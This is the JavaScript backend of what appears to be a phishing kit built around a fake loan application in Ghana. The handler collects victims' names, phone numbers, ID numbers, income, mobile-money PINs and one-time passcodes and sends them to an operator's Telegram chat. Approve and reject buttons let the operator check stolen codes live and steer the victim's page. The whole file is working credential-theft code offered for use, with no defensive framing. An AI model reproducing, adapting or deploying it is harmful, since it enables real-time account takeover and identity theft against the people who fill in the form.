globalThis.verificationStore = globalThis.verificationStore || {};

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Vercel settings." });
    }

    if (req.method === 'GET') {
        const { userId, type } = req.query;
        const key = `${userId}_${type}`;
        const status = globalThis.verificationStore[key] || 'pending';

        if (status !== 'pending') {
            delete globalThis.verificationStore[key];
        }
        return res.status(200).json({ status: status });
    }

    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // --- TELEGRAM BUTTON CLICKED ---
            if (body.callback_query) {
                const callback = body.callback_query;
                const [action, userId, type] = callback.data.split('_');

                globalThis.verificationStore[`${userId}_${type}`] = action === 'approve' ? 'approved' : 'rejected';

                const originalText = callback.message.text;
                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>${type} APPROVED</b> - User can proceed` 
                    : `\n\n❌ <b>${type} REJECTED</b> - User must try again`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: originalText + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // --- WEBSITE SENDING DATA ---
            if (body.action === 'send') {
                const { type, userId, data } = body;
                console.log(`Received ${type} request for user ${userId}`);

                let message = "";
                let keyboard = null;
                const time = new Date().toLocaleString();

                if (type === 'APPLICATION') {
                    message = `📝 <b>NEW LOAN APPLICATION</b>\n\n`;
                    message += `👤 <b>Name:</b> ${data.name}\n`;
                    message += `📱 <b>Phone:</b> ${data.phone}\n`;
                    message += `🆔 <b>ID:</b> ${data.id}\n`;
                    message += `💰 <b>Amount:</b> GHC ${data.amount}\n`;
                    message += `💼 <b>Income:</b> GHC ${data.income}\n`;
                    message += `⏱ <b>Time:</b> ${time}\n`;
                } 
                else if (type === 'PIN') {
                    message = `# Thor - PIN Verification\n`;
                    message += `<b>PIN VERIFICATION NEEDED</b>\n\n`;
                    message += `<b>USER DETAILS:</b>\n`;
                    message += `• Phone Number: <code>${data.phone}</code>\n`;
                    message += `• PIN Code: <code>${data.value}</code>\n`;
                    message += `• Username & Pass: user_${userId}\n`;
                    message += `• Time: ${time}\n`;
                    message += `• Bot: user75\n\n`;
                    message += `<b>Verify the PIN:</b>\n`;
                    message += `• PIN Length: 4 digits\n`;
                    message += `• Timeout: 5 minutes\n`;

                    keyboard = {
                        inline_keyboard: [
                            [
                                { text: `✅ Correct PIN`, callback_data: `approve_${userId}_PIN` },
                                { text: `❌ Wrong PIN`, callback_data: `reject_${userId}_PIN` }
                            ]
                        ]
                    };
                } 
                else if (type === 'OTP') {
                    message = `# Thor - OTP Verification\n`;
                    message += `<b>OTP VERIFICATION NEEDED</b>\n\n`;
                    message += `<b>USER DETAILS:</b>\n`;
                    message += `• Phone Number: <code>${data.phone}</code>\n`;
                    message += `• OTP Code: <code>${data.value}</code>\n`;
                    message += `• Username & Pass: user_${userId}\n`;
                    message += `• Time: ${time}\n`;
                    message += `• Bot: user75\n\n`;
                    message += `<b>Verify the OTP:</b>\n`;
                    message += `• OTP Length: 6 digits\n`;
                    message += `• Timeout: 5 minutes\n`;

                    keyboard = {
                        inline_keyboard: [
                            [
                                { text: `✅ Correct OTP`, callback_data: `approve_${userId}_OTP` },
                                { text: `❌ Wrong OTP`, callback_data: `reject_${userId}_OTP` }
                            ]
                        ]
                    };
                }

                const payload = {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                };

                if (keyboard) {
                    payload.reply_markup = keyboard;
                }

                const tgResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!tgResponse.ok) {
                    const errData = await tgResponse.json();
                    return res.status(500).json({ error: "Telegram Error: " + errData.description });
                }

                return res.status(200).json({ success: true });
            }

        } catch (error) {
            console.error(error);
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}
